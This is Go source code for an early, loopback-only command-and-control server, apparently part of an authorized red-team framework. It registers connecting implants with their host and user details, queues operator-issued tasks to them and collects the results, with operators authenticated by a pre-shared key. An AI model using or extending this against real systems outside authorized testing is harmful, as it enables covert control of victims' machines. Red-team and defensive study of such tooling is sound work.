package main

// c2server — M0 loopback slice of the authorized red-team C2 v2 server.
//
// Two listeners:
//   - client listener  (default 127.0.0.1:9909): implants connect, send hello,
//     receive tasks, return results.
//   - operator listener (default 127.0.0.1:9910): authenticated operator CLI.
//
// Authorization scope and rules: docs/AUTHORIZED_USE.md. This binary performs no
// outbound connections on its own; it only talks to already-connected peers.

import (
	"bufio"
	"crypto/sha256"
	"crypto/subtle"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	registry    = newRegistry()
	serverStart = time.Now()
)

func main() {
	var (
		clientAddr   = flag.String("client-addr", envOr("C2_CLIENT_LISTEN", "127.0.0.1:9909"), "client listener address")
		operatorAddr = flag.String("operator-addr", envOr("C2_OPERATOR_LISTEN", "127.0.0.1:9910"), "operator listener address")
		psk          = flag.String("psk", envOr("C2_OPERATOR_PSK", ""), "operator PSK (or set C2_OPERATOR_PSK)")
		pskFile      = flag.String("psk-file", envOr("C2_OPERATOR_PSK_FILE", ""), "file containing the operator PSK")
		opUser       = flag.String("operator-user", envOr("C2_OPERATOR_USER", "ops"), "operator username")
		noAuth       = flag.Bool("insecure-no-auth", false, "DANGER: disable operator auth (loopback lab only)")
	)
	flag.Parse()

	secret := *psk
	if secret == "" && *pskFile != "" {
		b, err := os.ReadFile(*pskFile)
		if err != nil {
			log.Fatalf("read psk file: %v", err)
		}
		secret = strings.TrimSpace(string(b))
	}
	if secret == "" && !*noAuth {
		log.Fatalf("refusing to start without operator PSK; set C2_OPERATOR_PSK, --psk or --psk-file (or --insecure-no-auth on loopback)")
	}
	if *noAuth {
		log.Printf("WARNING: operator authentication disabled (--insecure-no-auth)")
	}
	if secret != "" && isWeak(secret) {
		log.Printf("WARNING: operator PSK looks weak (len=%d); use >=16 random bytes for anything but loopback", len(secret))
	}

	var wg sync.WaitGroup
	errCh := make(chan error, 2)
	if cl, err := net.Listen("tcp", *clientAddr); err != nil {
		log.Fatalf("client listener %s: %v", *clientAddr, err)
	} else {
		log.Printf("client listener on %s", cl.Addr())
		wg.Add(1)
		go func() { defer wg.Done(); errCh <- serve(cl, func(c net.Conn) { handleClient(c) }) }()
	}
	if ol, err := net.Listen("tcp", *operatorAddr); err != nil {
		log.Fatalf("operator listener %s: %v", *operatorAddr, err)
	} else {
		log.Printf("operator listener on %s (user=%s)", ol.Addr(), *opUser)
		wg.Add(1)
		go func() {
			defer wg.Done()
			errCh <- serve(ol, func(c net.Conn) {
				handleOperator(c, opAuth{enabled: !*noAuth, user: *opUser, secret: secret})
			})
		}()
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	select {
	case s := <-sig:
		log.Printf("signal %v, shutting down", s)
	case err := <-errCh:
		if err != nil {
			log.Printf("listener stopped: %v", err)
		}
	}
}

func isWeak(s string) bool {
	common := map[string]bool{"changeme": true, "password": true, "psk": true, "test": true, "secret": true}
	return len(s) < 16 || common[strings.ToLower(s)]
}

func envOr(k, d string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return d
}

func serve(l net.Listener, handler func(net.Conn)) error {
	for {
		c, err := l.Accept()
		if err != nil {
			if errors.Is(err, net.ErrClosed) {
				return nil
			}
			return err
		}
		go handler(c)
	}
}

// ---------------------------------------------------------------------------
// Client side
// ---------------------------------------------------------------------------

func handleClient(c net.Conn) {
	defer c.Close()
	remote := c.RemoteAddr().String()
	c.SetDeadline(time.Now().Add(30 * time.Second))
	br := bufio.NewReader(c)
	m, err := readFrame(br)
	if err != nil {
		log.Printf("client %s: read hello: %v", remote, err)
		return
	}
	if str(m, "t") != "hello" {
		log.Printf("client %s: expected hello, got %q", remote, str(m, "t"))
		return
	}
	clientID := str(m, "client_id")
	if clientID == "" {
		clientID = "unnamed-" + remote
	}

	// Reconnect semantics: the newest connection for a client id wins.
	if old := registry.byClientID(clientID); old != nil {
		log.Printf("client %s: replacing previous session %s", clientID, old.ID)
		registry.remove(old)
		select {
		case old.sendCh <- msg{"t": "shutdown"}:
		default:
		}
	}

	s := newSession(clientID)
	s.Hostname = str(m, "hostname")
	s.OS = str(m, "os")
	s.Arch = str(m, "arch")
	s.User = str(m, "user")
	s.Suite = str(m, "suite")
	s.Version = str(m, "version")
	s.PID = num(m, "pid")
	s.RemoteAddr = remote
	s.Connected = time.Now()
	registry.add(s)
	log.Printf("client registered: %s id=%s host=%s os=%s/%s suite=%s from=%s", s.ID, clientID, s.Hostname, s.OS, s.Arch, s.Suite, remote)

	c.SetDeadline(time.Time{})

	writerDone := make(chan struct{})
	go func() {
		defer close(writerDone)
		for fm := range s.sendCh {
			c.SetWriteDeadline(time.Now().Add(15 * time.Second))
			if err := writeFrame(c, fm); err != nil {
				log.Printf("client %s: write: %v", s.ID, err)
				c.Close()
				return
			}
		}
	}()

	if err := writeFrame(c, msg{
		"t":           "hello_ack",
		"session_id":  s.ID,
		"interval":    20,
		"server_time": time.Now().Unix(),
	}); err != nil {
		log.Printf("client %s: hello_ack: %v", s.ID, err)
		return
	}

	defer func() {
		registry.remove(s)
		close(s.sendCh)
		<-writerDone
		log.Printf("client disconnected: %s id=%s", s.ID, s.ClientID)
	}()

	for {
		c.SetReadDeadline(time.Now().Add(10 * time.Minute))
		fm, err := readFrame(br)
		if err != nil {
			return
		}
		switch str(fm, "t") {
		case "heartbeat":
			s.touch()
		case "pong":
			s.touch()
		case "result":
			r := &Result{
				TaskID: str(fm, "task_id"),
				Kind:   str(fm, "kind"),
				OK:     fm["ok"] == true,
				Data:   str(fm, "data"),
				Err:    str(fm, "err"),
				At:     time.Now(),
			}
			s.deliver(r)
			log.Printf("result from %s task=%s kind=%s ok=%v bytes=%d", s.ID, r.TaskID, r.Kind, r.OK, len(r.Data))
		default:
			log.Printf("client %s: ignoring frame %q", s.ID, str(fm, "t"))
		}
	}
}

// ---------------------------------------------------------------------------
// Operator side
// ---------------------------------------------------------------------------

type opAuth struct {
	enabled bool
	user    string
	secret  string
}

func (a opAuth) check(user, psk string) bool {
	if !a.enabled {
		return true
	}
	if subtle.ConstantTimeCompare([]byte(user), []byte(a.user)) != 1 {
		return false
	}
	x := sha256.Sum256([]byte(psk))
	y := sha256.Sum256([]byte(a.secret))
	return subtle.ConstantTimeCompare(x[:], y[:]) == 1
}

func handleOperator(c net.Conn, auth opAuth) {
	defer c.Close()
	remote := c.RemoteAddr().String()
	br := bufio.NewReader(c)
	c.SetDeadline(time.Now().Add(60 * time.Second))

	m, err := readFrame(br)
	if err != nil {
		return
	}
	if str(m, "t") != "login" {
		writeFrame(c, msg{"t": "login_ack", "ok": false, "err": "expected login"})
		return
	}
	user, psk := str(m, "user"), str(m, "psk")
	if !auth.check(user, psk) {
		log.Printf("operator %s: auth failed (user=%q)", remote, user)
		writeFrame(c, msg{"t": "login_ack", "ok": false, "err": "invalid credentials"})
		return
	}
	log.Printf("operator %s: logged in as %q", remote, user)
	if err := writeFrame(c, msg{
		"t":           "login_ack",
		"ok":          true,
		"server_time": time.Now().Unix(),
		"sessions":    registry.count(),
	}); err != nil {
		return
	}
	c.SetDeadline(time.Time{})

	for {
		c.SetReadDeadline(time.Now().Add(30 * time.Minute))
		cm, err := readFrame(br)
		if err != nil {
			return
		}
		resp := handleOperatorCommand(cm)
		if err := writeFrame(c, resp); err != nil {
			return
		}
		if str(cm, "t") == "quit" {
			return
		}
	}
}

func handleOperatorCommand(cm msg) msg {
	switch str(cm, "t") {
	case "list", "sessions":
		list := registry.list()
		return msg{"t": "sessions", "ok": true, "count": len(list), "sessions": list}
	case "stats":
		return msg{
			"t":           "stats",
			"ok":          true,
			"sessions":    registry.count(),
			"uptime_secs": int64(time.Since(serverStart).Seconds()),
			"server_time": time.Now().Unix(),
			"version":     "0.1.0-m0",
			"protocol":    "m0-json/1",
		}
	case "task":
		return operatorTask(cm)
	case "result":
		return operatorResult(cm)
	case "ping":
		return msg{"t": "pong", "ok": true, "ts": time.Now().Unix()}
	case "quit":
		return msg{"t": "bye", "ok": true}
	default:
		return msg{"t": "error", "ok": false, "err": "unknown command: " + str(cm, "t")}
	}
}

func operatorTask(cm msg) msg {
	sid := str(cm, "session_id")
	s := registry.get(sid)
	if s == nil {
		return msg{"t": "error", "ok": false, "err": "unknown session: " + sid}
	}
	kind := str(cm, "kind")
	if kind == "" {
		kind = "sysinfo"
	}
	waitSecs := num(cm, "wait")
	if waitSecs <= 0 {
		waitSecs = 20
	}
	taskID := newID("t")
	task := msg{"t": "task", "task_id": taskID, "kind": kind, "arg": str(cm, "arg")}
	select {
	case s.sendCh <- task:
	case <-time.After(5 * time.Second):
		return msg{"t": "error", "ok": false, "err": "client send queue full"}
	}
	r, ok := s.await(taskID, time.Duration(waitSecs)*time.Second)
	if !ok {
		return msg{"t": "timeout", "ok": false, "task_id": taskID, "session_id": sid,
			"err": fmt.Sprintf("no result within %ds", waitSecs)}
	}
	return msg{
		"t": "result", "ok": true, "session_id": sid, "task_id": r.TaskID,
		"kind": r.Kind, "result_ok": r.OK, "data": r.Data, "err": r.Err, "at": r.At.Unix(),
	}
}

func operatorResult(cm msg) msg {
	sid := str(cm, "session_id")
	s := registry.get(sid)
	if s == nil {
		return msg{"t": "error", "ok": false, "err": "unknown session: " + sid}
	}
	taskID := str(cm, "task_id")
	if taskID == "" {
		return msg{"t": "error", "ok": false, "err": "task_id required"}
	}
	wait := num(cm, "wait")
	if wait <= 0 {
		wait = 5
	}
	r, ok := s.await(taskID, time.Duration(wait)*time.Second)
	if !ok {
		return msg{"t": "timeout", "ok": false, "task_id": taskID}
	}
	return msg{"t": "result", "ok": true, "session_id": sid, "task_id": r.TaskID,
		"kind": r.Kind, "result_ok": r.OK, "data": r.Data, "err": r.Err, "at": r.At.Unix()}
}
